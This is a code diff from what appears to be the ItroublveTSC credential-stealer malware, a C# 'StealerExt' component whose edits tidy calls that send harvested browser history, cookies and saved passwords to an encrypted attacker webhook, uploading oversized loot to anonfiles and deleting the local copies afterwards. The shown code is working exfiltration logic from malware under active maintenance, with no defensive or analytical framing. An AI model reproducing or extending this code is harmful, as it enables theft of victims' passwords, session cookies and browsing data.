@@ -21,7 +21,7 @@ namespace StealerExt
 			if (string.IsNullOrEmpty(File.ReadAllText(_history)))
 			{
 
-				new API(wHook).SendHistory("History file is empty.", null);
+				new API(wHook).SendHistory("History file is empty.");
 				return;
 			}
 			long s = new FileInfo(_history).Length;
@@ -34,7 +34,7 @@ namespace StealerExt
 				}
 				else
 				{
-					new API(wHook).SendHistory("No history found", null);
+					new API(wHook).SendHistory("No history found");
 				}
 			}
 			else
@@ -58,12 +58,12 @@ namespace StealerExt
 							history += "Browser History: " + ResponseBody.Split('"')[15] + "\r\n";
 						}
 					}
-					new API(wHook).SendHistory(history, null);
+					new API(wHook).SendHistory(history);
 				}
 				catch (WebException ex)
 				{
 					history += "History ex (anonfiles): " + ex.Message + "\r\n";
-					new API(wHook).SendHistory(history, null);
+					new API(wHook).SendHistory(history);
 				}
 			}
 			File.Delete(_history);
@@ -84,7 +84,7 @@ namespace StealerExt
 			long size_c = new FileInfo(text).Length;
 			if (string.IsNullOrEmpty(File.ReadAllText(text))) 
 			{
-				new API(wHook).SendCookies("Cookies file is empty.", null);
+				new API(wHook).SendCookies("Cookies file is empty.");
 				return;
 			}
 			if (size_c < 7950000)
@@ -96,7 +96,7 @@ namespace StealerExt
 				}
 				else
 				{
-					new API(wHook).SendCookies("No cookies found!", null);
+					new API(wHook).SendCookies("No cookies found!");
 				}
 			}
             else
@@ -120,12 +120,12 @@ namespace StealerExt
 							info += "Browser Cookies: " + ResponseBody.Split('"')[15] + "\r\n";
 						}
 					}
-					new API(wHook).SendCookies(info, null);
+					new API(wHook).SendCookies(info);
 				}
 				catch (Exception ex)
 				{
 					info += "Cookies Exception [Anonfiles]: " + ex.Message + "\r\n";
-					new API(wHook).SendCookies(info, null);
+					new API(wHook).SendCookies(info);
 				}
 			}
 			File.Delete(text);
@@ -137,7 +137,7 @@ namespace StealerExt
 			string passwordLoc = Path.Combine(Temp + "Passwords.txt");
 			if (string.IsNullOrEmpty(File.ReadAllText(passwordLoc))) 
 			{
-				new API(wHook).SendPasswords("Password file is empty.", null);
+				new API(wHook).SendPasswords("Password file is empty.");
 				return;
 			}
 			long size_psw = new FileInfo(passwordLoc).Length;
@@ -149,7 +149,7 @@ namespace StealerExt
 				}
 				else
 				{
-					new API(wHook).SendPasswords("No browser passwords found!", null);
+					new API(wHook).SendPasswords("No browser passwords found!");
 				}
 			}
             else
@@ -173,17 +173,16 @@ namespace StealerExt
 							info += "Browser Passwords: " + ResponseBody.Split('"')[15] + "\r\n";
 						}
 					}
-					new API(wHook).SendPasswords(info, null);
+					new API(wHook).SendPasswords(info);
 				}
 				catch (WebException ex)
 				{
 					info += "Passwords ex (anonfiles): " + ex.Message + "\r\n";
-					new API(wHook).SendPasswords(info, null);
+					new API(wHook).SendPasswords(info);
 				}
 			}
 			File.Delete(passwordLoc);
 		}
-		
 
 		// Junk... Can't bother updating tho and who cares :c
 		public bool SendCookies(string content = null, string file = null)
@@ -322,8 +321,8 @@ namespace StealerExt
 		}
 
         public static string wHook => Hook._DecryptedHook;
-		public static string name = "ItroublveTSC 6.2";
-		public static string pfp = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaZLjMqLWHlL0VMxjLOEYXohyV6C9dsEjKsg&usqp=CAU";
+		public const string name = "ItroublveTSC 6.2";
+		public const string pfp = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaZLjMqLWHlL0VMxjLOEYXohyV6C9dsEjKsg&usqp=CAU";
 		private HttpClient _Client;
 		private string _URL;
 		public string _name { get; set; }
